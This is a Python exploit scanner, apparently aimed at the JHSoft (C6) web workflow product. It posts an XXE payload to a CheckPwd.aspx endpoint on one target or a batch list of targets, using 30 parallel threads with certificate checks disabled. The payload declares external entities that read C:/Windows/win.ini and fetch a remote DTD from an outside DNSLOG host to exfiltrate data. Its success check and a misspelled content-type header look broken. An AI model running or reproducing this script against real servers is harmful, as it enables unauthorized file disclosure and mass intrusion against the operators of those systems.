import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    banner = """
       _________    _____   ____  _______  __ ___________ 
      / ___\__  \  /     \_/ __ \/  _ \  \/ // __ \_  __ \
     / /_/  > __ \|  Y Y  \  ___(  <_> )   /\  ___/|  | \/
     \___  (____  /__|_|  /\___  >____/ \_/  \___  >__|   
    /_____/     \/      \/     \/                \/                                                                         

    """
    print(banner)
    parse = argparse.ArgumentParser(description="漏洞描述")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    args = parse.parse_args()
    targets = []
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            check(f"http://{args.url}")
    elif args.file:
        with open(args.file) as f:
            for target in f:
                target = target.strip()
                if 'http' in target:
                    targets.append(target)
                else:
                    targets.append(f"http://{target}")
    pool = Pool(30)
    pool.map(check, targets)

def check(target):
    url = f"{target}/C6/JHSoft.Web.WorkFlat/CheckPwd.aspx/"
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.2852.25 Safari/537.36',
        'onCtent-Type':'application/xml',
        'Content-Length':'199',
        'Connection':'close'
    }
    data = """<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % remote SYSTEM "http://<DNSLOG>">
%remote;
%all;
]><root>&send;</root>"""
    response = requests.post( url, headers=headers,data=data ,verify=False,timeout=5)
    try:
        if response.status_code == 200 and 'uid' in response.text:
            print(f"{target}存在xml注入")
        else:
            print(f"{target}不存在")
    except Exception as e:
        pass

if __name__ == '__main__':
    main()